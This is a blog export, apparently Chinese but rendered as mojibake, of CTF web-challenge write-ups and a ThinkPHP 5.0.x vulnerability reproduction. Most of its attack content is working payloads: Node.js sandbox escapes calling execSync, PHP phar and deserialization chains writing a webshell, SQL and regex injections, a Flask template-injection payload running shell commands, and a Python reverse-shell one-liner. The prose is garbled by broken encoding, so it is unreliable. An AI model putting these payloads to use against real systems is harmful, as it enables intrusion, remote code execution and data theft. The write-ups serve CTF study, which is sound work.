ä½†æ˜¯å³ä½¿ä¸€ä¸ªå‡½æ•°éƒ½æ²¡æœ‰ï¼Œä¹Ÿå¯ä»¥è¿™æ ·æ„é€ (PS:å¯ä»¥è‡ªå·±å»è¯•è¯•) 1const a=&apos;&apos;.constructor.constructor(&quot;return process;&quot;)(); æ—¢ç„¶æœ‰äº†processï¼Œé‚£ä¸€åˆ‡éƒ½å¥½åŠäº† é€šè¿‡process.mainModuleè·å¾—å½“å‰æ¨¡å—å¯ä»¥ç”¨å½“å‰æ¨¡å—è°ƒç”¨requireï¼Œå¼•å…¥child_processæ¨¡å—ï¼Œåœ¨child_processæ¨¡å—ä¸­æœ‰è®¸å¤šå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°èƒ½å¤Ÿä½¿ç”¨ï¼Œæœ€åï¼Œç”±äºé¢˜ç›®æ˜¾ç¤ºçš„æ˜¯è¿”å›å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä»¥å‡½æ•°è¿”å›çš„å½¢å¼è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœã€‚æœ€ç»ˆçš„payload 1(function()&#123;const a=clearImmediate.constructor(&quot;return process;&quot;)(); return a.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;)() [ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMeä¸€é“SSRFï¼Œå°†å†…ç½‘åœ°å€éƒ½è¿‡æ»¤äº†ï¼Œåœ¨æ­¤å¤„æœ‰ä¸‰ç§æ–¹å¼ç»•è¿‡ã€‚ åˆ©ç”¨Curlä¸Parseurlè§£æçš„ä¸åŒç»•è¿‡ï¼Œåœ¨æˆ‘çš„å¦ä¸€ç¯‡SSRFå­¦ä¹ ä¸­æœ‰æåˆ°ã€‚ åˆ©ç”¨DNSé‡ç»‘å®šæ¼æ´ï¼ŒåŒä¸Šã€‚ 0.0.0.0æœªè¢«è¿‡æ»¤ï¼Œ0.0.0.0çš„IPåœ°å€è¡¨ç¤ºæ•´ä¸ªç½‘ç»œ ä½†æ˜¯åœ¨BUUä¸Šï¼Œåªèƒ½ä½¿ç”¨ç¬¬ä¸‰ç§æ–¹å¼ç»•è¿‡(æ— æ³•è®¿é—®å¤–ç½‘)ã€‚ 1payload:/?url=http://0.0.0.0/hint.php å¾—åˆ°Rediså¯†ç ã€‚ é‚£å°±ç›´æ¥ç”¨gopherå†™WebShellå’¯ï¼Œå…·ä½“ä¹Ÿåœ¨æˆ‘çš„SSRFæ–‡ç« ä¸­æœ‰å†™åˆ°ï¼Œå½“ç„¶åœ¨BUUä¸Šå¯ä»¥å¼€ä¸€ä¸ªlinuxé¶æœºï¼Œä¸»ä»å¤åˆ¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ [HarekazeCTF2019]encode_and_encodeä½¿ç”¨json_decodeè·å–æ•°æ®ï¼ŒæŸ¥çœ‹å®˜æ–¹æ‰‹å†Œã€‚ æ”¯æŒUTF-8ç¼–ç ï¼Œé‚£å°±æ˜¯æ”¯æŒunicodeï¼Œç›´æ¥unicodeç¼–ç ç»•è¿‡WAFï¼Œä½¿ç”¨phpä¼ªåè®®è¯»å–flagã€‚ 1&#123;&quot;\\u0070\\u0061\\u0067\\u0065&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0072\\u0065\\u0061\\u0064\\u003d\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0066\\u006c\\u0061\\u0067&quot;&#125; [BJDCTF2020]EzPHPæºç å‘ç°ä¸€æ®µbase32åŠ å¯†çš„å­—ç¬¦ï¼Œè§£å¯†è¿›å…¥1nD3x.phpã€‚ ç¬¬ä¸€å…³ï¼šç»•è¿‡$_SERVER[â€˜QUERY_STRINGâ€™] ç”±äº$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šurldecodeï¼Œæ‰€ä»¥å°†ä¸Šä¼ çš„å‚æ•°urlencodeä¸€æ¬¡å³å¯ç»•è¿‡ã€‚ ç¬¬äºŒå…³ï¼šç»•è¿‡$æ­£åˆ™åŒ¹é… $åœ¨å•è¡ŒæŸ¥è¯¢ä¸‹ä¸ä¼šè¿›è¡ŒåŒ¹é…æ¢è¡Œç¬¦ï¼Œ%0aæ¢å·ç¬¦ç»•è¿‡ã€‚ ç¬¬ä¸‰å…³ï¼šç»•è¿‡$_REQUEST ç¿»é˜…PHPæ‰‹å†Œï¼Œå‘ç°$_REQUESTæ•°ç»„è·å¾—å€¼å¾—é¡ºåºæŒ‰ç…§php.iniä¸­çš„variables_orderé…ç½®ã€‚ åœ¨é»˜è®¤æƒ…å†µä¸‹variables_orderå¾—å€¼æ˜¯ EGPCS (Environment, Get, Post, Cookie, and Server)ï¼Œé¦–å…ˆè·å¾—GETä¸­çš„å€¼ï¼Œç„¶åå†è·å–POSTä¸­å¾—å€¼ï¼Œè¿™é‡Œå°±å¯¼è‡´äº†å˜é‡è¦†ç›–ï¼Œæ‰€ä»¥ç”¨POSTæ–¹æ³•ä¸Šä¼ å‚æ•°å°†GETçš„å‚æ•°è¦†ç›–å³å¯ç»•è¿‡ã€‚ ç¬¬å››å…³ï¼šç»•è¿‡file_get_contents($file) ä½¿ç”¨dataåè®® ç¬¬äº”å…³ï¼šmd5ç»å¯¹æ¯”è¾ƒ ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚ ç¬¬å…­å…³ï¼šå‘½ä»¤æ‰§è¡Œ$code(&#39;&#39;, $arg);å½¢å¼ å…³é”®ç‚¹åœ¨äºï¼š ä½¿ç”¨create_functionç»•è¿‡ï¼Œç”±äºcreate_functionåŸºäºevalå®ç°ï¼Œå¯ä»¥è¿›è¡Œæ‹¼æ¥ç»•è¿‡ PHP è‡ªåŠ¨å°†è£¸å­—ç¬¦ä¸²ï¼ˆæ²¡æœ‰å¼•å·çš„å­—ç¬¦ä¸²ä¸”ä¸å¯¹åº”äºä»»ä½•å·²çŸ¥ç¬¦å·ï¼‰è½¬æ¢æˆä¸€ä¸ªå…¶å€¼ä¸ºè¯¥è£¸å­—ç¬¦ä¸²çš„æ­£å¸¸å­—ç¬¦ä¸²ã€‚ fopen,fgetæœªè¢«è¿‡æ»¤ defineå‡½æ•°å¯ä»¥å®šä¹‰å¸¸é‡ï¼Œget_defined_vars() 1&#125;define(a,fopen(base64_decode(cmVhMWZsNGcucGhw),r));while(!feof(a))var_dump(fgets(a));fclose(a);// urlencodeå³å¯å¾—åˆ°flagã€‚ [SWPUCTF 2018]SimplePHPfile.phpå¯ä»¥è¯»æºç ï¼Œé¦–å…ˆå°†æºç è¯»å–ä¸€éï¼ˆfile.php,upload_file.php,class.php,function.phpï¼‰ã€‚ å›¾ç‰‡é™åˆ¶åç¼€.jpgï¼Œéå¸¸æ˜æ˜¾ä¸€é“pharååºåˆ—åŒ–ï¼Œè§¦å‘ç‚¹åœ¨file.phpçš„is_file()å‡½æ•°ï¼Œé“¾å­ä¹Ÿå¾ˆç®€å•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct() &#123; $this-&gt;str = new Show(); &#125;&#125;class Show&#123; public $source; public $str; public function __construct() &#123; $this-&gt;str[&apos;str&apos;]=new Test(); echo $this-&gt;source; &#125;&#125;class Test&#123; public $params; public function __construct() &#123; $this-&gt;params[&apos;source&apos;]=&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/f1ag.php&quot;; &#125;&#125;$a=new C1e4r();echo serialize($a);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering(); æ”¹åä¸º1.jpgï¼Œä¸Šä¼ ï¼Œå¯ä»¥åœ¨functionå¤„å‘ç°æ–‡ä»¶å‘½åè§„åˆ™ã€‚ åœ¨fileå¤„è¾“å…¥phar:///var/www/html/upload/æ–‡ä»¶åï¼Œå³å¯å¾—åˆ°flagã€‚ [å¼ºç½‘æ¯ 2019]Uploadåœ¨www.tar.gzå‘ç°æºç ,æ˜¯ä¸€é“ååºåˆ—åŒ–ï¼Œé“¾å­æ¯”è¾ƒç®€å•ï¼Œé€šè¿‡Registerç±»çš„__destructæ–¹æ³•è°ƒç”¨Profileç±»çš„update_imgæ–¹æ³•ï¼Œåœ¨æ­¤å¤„ä¿®æ”¹æ–‡ä»¶åå³å¯ã€‚ 12345if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); pocå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace app\\web\\controller;class Register&#123; public $checker; public $registed; public function __construct() &#123; $this-&gt;checker=new Profile(); $this-&gt;registed=false; &#125;&#125;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;except['index']=\"img\"; $this-&gt;img=\"upload_img\"; $this-&gt;ext=1; $this-&gt;checker=0; $this-&gt;filename_tmp=\"./upload/04b0951938d905b41348c1548f9c338b/356f6894f245b0f1a97f01f1d6d4744a.png\"; $this-&gt;filename=\"./upload/04b0951938d905b41348c1548f9c338b/eval.php\"; &#125;&#125;$a=new Register();echo base64_encode(serialize($a)); [NCTF2019]SQLiä¸€é“sqlæ³¨å…¥ï¼Œrobots.txtä¸­æœ‰æç¤ºï¼Œå¾—åˆ°passwdå°±ä¼šè¾“å‡ºflagï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†å•å¼•å·ç­‰å­—ç¬¦ï¼Œå•å¼•å·èƒ½ç”¨åæ–œæ è½¬ä¹‰ï¼Œç©ºæ ¼ç”¨/**/ä»£æ›¿ï¼Œregexpæœªè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æ­£åˆ™æ³¨å…¥ 1username=1\\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00 é€ä½çˆ†ç ´å³å¯å¾—åˆ°å¯†ç ï¼Œè¾“å…¥å¯†ç å¾—åˆ°flagã€‚ [HFCTF2020]JustEscapeé¢˜ç›®è¯´çœŸçš„æ˜¯phpå—ï¼Œåœ¨nodejsä¸­ä¹Ÿæœ‰evalå‡½æ•°ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªnodeå‘½ä»¤Error().stackï¼Œæ‰“å°Errorè¢«å®ä¾‹åŒ–çš„ä½ç½®ï¼Œå¯ä»¥å‘ç°Errorè¢«å®ä¾‹åŒ–åœ¨æ²™ç®±å¤–ï¼Œæ‰€ä»¥å°±æ˜¯åˆ©ç”¨ErroræŠ¥é”™æ¥æ²™ç®±é€ƒé€¸äº†ã€‚ å¤§ä½¬çš„æ–‡ç« ï¼šhttps://www.anquanke.com/post/id/207291 githubä¸Šä¹Ÿæœ‰å…³äºErroræŠ¥é”™åˆ©ç”¨çš„payloadhttps://github.com/patriksimek/vm2/issues/225 æ”¹é¢˜ç›®è¿˜è¿‡æ»¤äº†è®¸å¤šå…³é”®å­—ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚ 12`$&#123;`$&#123;`prototy`&#125;pe`&#125;`=prototype //å˜é‡æ‹¼æ¥[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)joinæ–¹æ³•æ•°ç»„æ‹¼æ¥ 1234567891011(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat flag`)[`toString`](); &#125; &#125;)()////(function()&#123;TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();try&#123;Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;&#125;catch(e)&#123;return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;&#125;)()(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`whoami`).toString(); &#125;&#125;)() [ç½‘é¼æ¯2018]Unfinishä¸€é“äºŒæ¬¡æ³¨å…¥ 10&apos;+(select hex(hex(database())))+&apos;0 ä½¿ç”¨ä¸¤æ¬¡hexçš„åŸå› æ˜¯å¦‚æœhexç¼–ç ä¹‹åæœ‰å­—æ¯ï¼Œå°±ä¼šè¢«æˆªæ–­ï¼Œç»è¿‡ä¸¤æ¬¡hexç¼–ç åï¼Œå¯ä»¥è½¬æ¢ä¸ºçº¯æ•°å­—ï¼Œä¸0ç›¸åŠ è¿˜å¾—åŸæ•°ï¼Œæ¯æ¬¡çˆ†10ä½ï¼Œå¤šäº†ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºç§‘å­¦è®¡æ•°æ³•ã€‚ 10&apos;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&apos;0 [CSCCTF 2019 Qual]FlaskLightflasksstiï¼Œè¿‡æ»¤äº†__globals__å…³é”®å­—ï¼Œè°ƒç”¨__getattribute__base64ç¼–ç ç»•è¿‡ï¼Œè¯»å–flagã€‚ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(%27X19nbG9iYWxzX18=%27.decode(%27base64%27))[%27__builtins__%27][%27eval%27](%27__import__(&quot;os&quot;).popen(&quot;cd%20/flasklight;%20cat%20coomme_geeeett_youur_flek&quot;).read()%27)&#125;&#125; [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDownè¿™é¢˜ç›´æ¥../../../../../flagå°±è¯»åˆ°äº†ï¼Œåº”è¯¥æ˜¯éé¢„æœŸï¼Œæƒé™æ²¡è®¾ç½®å¥½ï¼Œé¢„æœŸè§£èµ°ä¸€éã€‚ ../../../../proc/self/cmdlineè¯»å–åˆ°app.pyï¼Œåœ¨linuxä¸‹ï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å…³é—­ï¼Œä¾¿ä¼šåœ¨/proc/[pid]/fd/innodeå¤„ä¿å­˜åŸæ–‡ä»¶ï¼Œå› ä¸º/proc/selfä»£è¡¨å½“å‰è¿›ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çˆ†ç ´ä¸€ä¸‹innodeï¼Œå¾—åˆ°secretfile 1hxk6hdQZnALSCYt/cqdPADFK9W7KC6VEJmax+uK8Bf8= æ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œå¼¹shell 1python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; è¯»å–flag [GYCTF2020]EasyThinkingthinkphp6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œé¦–å…ˆå°†sessionIdæ”¹ä¸ºä»»æ„é•¿32ã€ä»¥phpç»“å°¾çš„å­—ç¬¦aaaaaaaaaaaaaaaaaaaaaaaaaaaa.phpï¼Œä¸Šä¼ ååœ¨/runtime/sessionæ–‡ä»¶å¤¹ä¸­ï¼ŒAntSwordè¿æ¥ 1/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php å‘ç°æœ‰disable_functionç›´æ¥AntSword UAFç»•è¿‡ï¼Œçš„åˆ°flagã€‚ [WUSTCTF2020]CV Makeremmï¼Œç½‘ç«™åšçš„æŒºå¥½çš„ï¼Œç™»é™†è¿›å»ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¿®æ”¹ä¸€ä¸‹Content-Typeå’ŒåŠ ä¸€ä¸ªGIF89açš„å¤´å°±ä¸Šä¼ äº†ï¼Œç›´æ¥æ‰§è¡Œsystem(â€˜cat /Flag_aqi2282u922oijiâ€™); [b01lers2020]Welcome to Earthemmï¼Œç›´æ¥è¿›å…¥æœ€åä¸€å…³/fightï¼Œè‡ªå·±æ‹¼ä¸€ä¸‹flagå°±å‡ºæ¥äº†","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[]},{"title":"TP5.0.24","slug":"TP5.0.24æ¼æ´å¤ç°åˆé›†","date":"2020-09-29T16:00:00.000Z","updated":"2020-11-27T11:34:04.375Z","comments":true,"path":"2020/09/30/TP5.0.24æ¼æ´å¤ç°åˆé›†/","link":"","permalink":"http://yoursite.com/2020/09/30/TP5.0.24æ¼æ´å¤ç°åˆé›†/","excerpt":"","text":"TPæ¼æ´å¤ç°åˆé›†å‰è¨€è¯¥æ–‡ç« æ˜¯å„ç§TPæ¼æ´å¤ç°çš„åˆé›†ï¼Œåˆšå¼€å§‹å¤ç°çš„å°ä¼™ä¼´æœ€å¥½å…ˆçœ‹çœ‹å¼€å‘æ‰‹å†Œï¼Œä»”ç»†äº†è§£ä¸€ä¸‹æ¡†æ¶ç»“æ„ï¼Œèƒ½å¤Ÿä½¿ä½ æ›´å¿«å…¥æ‰‹ã€‚ TP5.0.15SQLæ³¨å…¥å¤ç°ç¯å¢ƒé…ç½®ä½¿ç”¨composerå®‰è£…TP5.0.15 composerèƒ½å¤Ÿæ›´åŠ æ–¹ä¾¿ã€å¿«é€Ÿçš„å®‰è£…å‡†ç¡®çš„æ¡†æ¶ç‰ˆæœ¬ï¼Œwindowsç¯å¢ƒåœ¨å®˜ç½‘ä¸‹è½½å®‰è£…ç¨‹åºï¼Œé€‰æ‹©PHPç‰ˆæœ¬(æœ€å¥½æ˜¯å¤§äº7.2)ï¼Œå®‰è£…æ—¶å¯ä»¥é…ç½®ä¸€ä¸‹ä»£ç†ï¼Œä¸ç„¶ä¼šå¾ˆæ…¢ã€‚ å®‰è£…å¥½åæ‰§è¡Œ composer create-project topthink/think tp 5.0.15æ›´å¤šçš„ç‰ˆæœ¬ä¹Ÿå¯ä»¥åœ¨composerå®˜ç½‘æ‰¾åˆ°ã€‚ ä½¿ç”¨composerçš„å¥½å¤„æ˜¯èƒ½å¤Ÿå¿«é€Ÿåˆ‡æ¢ç‰ˆæœ¬ï¼Œåªéœ€è¦å°†frameworkæ”¹æˆä½ è‡ªå·±æƒ³è¦çš„ç‰ˆæœ¬ï¼Œç„¶åæ‰§è¡Œcomposer updateå°±å¥½äº†ã€‚ æ•°æ®åº“é…ç½®é¦–å…ˆå»ºç«‹ä¸€ä¸ªæ•°æ®åº“tptestï¼Œç„¶åå»ºç«‹ä¸€ä¸ªuserè¡¨ï¼Œå­—æ®µæ˜¯id,usernameã€‚ å½±å“èŒƒå›´ThinkPHP 5.0.13~ThinkPHP 5.0.15 æ¼æ´å¤ç°æ¼æ´è§¦å‘ç‚¹åœ¨æ‰§è¡Œæ•°æ®æ’å…¥çš„æ—¶å€™ï¼Œæ‰€ä»¥å…ˆåœ¨indexæ§åˆ¶å™¨åˆ›å»ºä¸€ä¸ªæ’å…¥æ•°æ®çš„æ–¹æ³•ã€‚ 12345public function testsql() &#123; $username = input(&apos;get.username/a&apos;); db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;username&apos;=&gt;$username]); &#125; è®¿é—® 1http://localhost/public/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 æŠ¥é”™æ³¨å…¥æˆåŠŸã€‚ æ¼æ´åˆ†æè·Ÿå…¥insertæ–¹æ³•ï¼Œé‡ç‚¹åœ¨ç”Ÿæˆsqlè¯­å¥çš„å‡½æ•° è·Ÿå…¥$this-&gt;builder-&gt;insertæ–¹æ³• è·Ÿè¿›parseDataæ–¹æ³•ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦‚ä½•å¤„ç†æˆ‘ä»¬çš„æ•°æ®ã€‚ 12345678910111213141516171819 foreach ($data as $key =&gt; $val) &#123; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; // å¯¹è±¡æ•°æ®å†™å…¥ $val = $val-&gt;__toString(); &#125;elseif (is_array($val) &amp;&amp; !empty($val)) &#123; switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; å¯ä»¥åœ¨ç”¨æˆ·æ‰‹å†Œçœ‹åˆ°è¯´æ˜ï¼Œåœ¨thinkphp5.0.5åŠ å…¥äº†expã€incã€decæ–¹æ³•æ¥å¤„ç†æ•°æ®ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿å­—æ®µçš„è‡ªå¢ä¸è‡ªå‡ï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´è§¦å‘ç‚¹ã€‚ ç”±äºæ²¡æœ‰å¯¹æ•°æ®åšä»»ä½•è¿‡æ»¤å¤„ç†ï¼Œå¤„ç†å®Œæ•°æ®åï¼Œç›´æ¥æ‹¼æ¥æˆsqlè¯­å¥å¹¶æ‰§è¡Œï¼Œæ‰å¯¼è‡´æŠ¥é”™æ³¨å…¥çš„å‘ç”Ÿã€‚ 1INSERT INTO `user` (`username`) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œä¸incæ•ˆæœç±»ä¼¼çš„å…³é”®å­—è¿˜æœ‰expä¸decï¼Œäºæ˜¯æˆ‘ä»¬è¯•ä¸€è¯•è¿™ä¸¤ä¸ªå…³é”®å­—èƒ½ä¸èƒ½è§¦å‘ã€‚ 1http://localhost/public/index.php/index/index/testsql?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 decå…³é”®å­—è§¦å‘æ¼æ´æˆåŠŸï¼Œä½†æ˜¯expå…³é”®å­—è§¦å‘æ¼æ´å¤±è´¥äº†ã€‚ 1http://localhost/public/index.php/index/index/testsql?username[0]=exp&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 ç»è¿‡è°ƒè¯•ï¼Œå‘ç°thinkphpå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†è¿‡æ»¤ï¼Œexpæ’åœ¨é»‘åå•æ¦œé¦–ã€‚ åœ¨expååŠ äº†ä¸€ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´caseåˆ¤æ–­å¤±è´¥ã€‚ ä½†æ˜¯è¯¥SQLæ³¨å…¥æ— æ³•æ‰§è¡Œå¤šå¥ï¼Œæ‰€ä»¥æ¯”è¾ƒé¸¡è‚‹ã€‚ TP5.0.*ä»»æ„ä»£ç æ‰§è¡Œ&amp;ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´å¤ç°ç¯å¢ƒé…ç½®æœ¬æ¬¡ä»¥TP5.0.0ç‰ˆæœ¬ä½œä¸ºå¤ç°ç‰ˆæœ¬ã€‚ 1composer create-project topthink/think tp 5.0.0 æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•ï¼Œå°†composer.jsonä¸­çš„ç‰ˆæœ¬ä¿¡æ¯ä¿®æ”¹ä¸º5.0.0ã€‚ å½±å“èŒƒå›´ThinkPHP 5.0.0 ~ ThinkPHP 5.0.23 æ¼æ´å¤ç°æ­å»ºå¥½æœåŠ¡ï¼Œå¹¶å‘é€å¦‚ä¸‹è¯·æ±‚ filterä¸­ä¸ºä½ æƒ³æ‰§è¡Œçš„å‡½æ•°ï¼Œs(ä»»æ„å˜é‡åéƒ½è¡Œ)ä¸ºå‚æ•°ï¼Œå³å¯å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ æ¼æ´åˆ†æTP5.0.*æ”¯æŒè¯·æ±‚ä¼ªè£…ï¼Œåœ¨è·å–è·¯ç”±æ—¶ï¼Œä½¿ç”¨think\\Requestsç±»çš„methodæ–¹æ³•å®ç°ã€‚ 123if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST); å¯ä»¥çœ‹åˆ°ï¼Œå®ƒåœ¨ä½¿ç”¨äº†å¯å˜å‡½æ•°ï¼Œä¸ºçš„æ˜¯è°ƒç”¨ç±»ä¸­çš„å…¶ä»–è¯·æ±‚æ–¹æ³•ï¼Œæ¯”å¦‚getã€postæ–¹æ³•ï¼Œå®ç°è¯·æ±‚ä¼ªè£…ä½†æ˜¯è¿™ä¹Ÿè®©æˆ‘ä»¬å¯ä»¥ä»»æ„è°ƒç”¨è¯¥ç±»ä¸­çš„å‡½æ•°ã€‚ æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨è¯¥ç±»çš„__constructæ–¹æ³•ä¸­ï¼Œç”±äº$optionå‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ä»»æ„è¦†ç›–è¯¥ç±»ä¸­çš„å‚æ•°ã€‚ 123if (property_exists($this, $name)) &#123; $this-&gt;$name = $item;&#125; æˆ‘ä»¬è¦è¦†ç›–çš„å‚æ•°æœ‰ä¸¤ä¸ª filterå‚æ•° filterå®šä¹‰åœ¨Requestsç±»ä¸­ï¼Œä½œä¸ºå…¨å±€çš„è¿‡æ»¤å™¨ï¼Œä¸€èˆ¬ä½¿ç”¨htmlspecialcharsä¹‹ç±»çš„å‡½æ•°è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œæ„æ€å°±æ˜¯è¯´ä¼šå°†æŒ¨æ¬¡çš„å°†çš„GETã€POSTçš„æ‰€æœ‰æ•°æ®ä½œä¸ºè¯¥å‡½æ•°çš„å‚æ•°æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¦†ç›–filterå‡½æ•°ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ¶æ„å‡½æ•°systemä¹‹ç±»çš„ã€‚ methodå‚æ•° åœ¨è·å–è·¯ç”±åï¼Œthinkphpä¼šè·å–å½“å‰çš„è·¯ç”±è§„åˆ™ 123$method = $request-&gt;method();// è·å–å½“å‰è¯·æ±‚ç±»å‹çš„è·¯ç”±è§„åˆ™$rules = self::$rules[$method]; å½“è·¯ç”±è§„åˆ™ä¸åœ¨rulesæ•°ç»„ä¸­ï¼Œä¼šäº§ç”ŸæŠ¥é”™ï¼Œä¸ºäº†é˜²æ­¢æŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥å°†methodè®¾ä¸ºä¸Šå›¾ä¸­çš„ä»»æ„å€¼ã€‚ thinkphpåœ¨æ‰§è¡Œç”¨æˆ·è°ƒç”¨æ§åˆ¶å™¨çš„æ–¹æ³•å‰ä¼šä½¿ç”¨è¿‡æ»¤å™¨å°†å…¨å±€å‚æ•°è¿‡æ»¤ä¸€éï¼Œè€Œè¿™æ—¶ï¼Œfilterå‡½æ•°å·²ç»è¢«æˆ‘ä»¬æ”¹æˆäº†è€Œå·²å‡½æ•°systemã€‚ 12345678private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value); &#125; 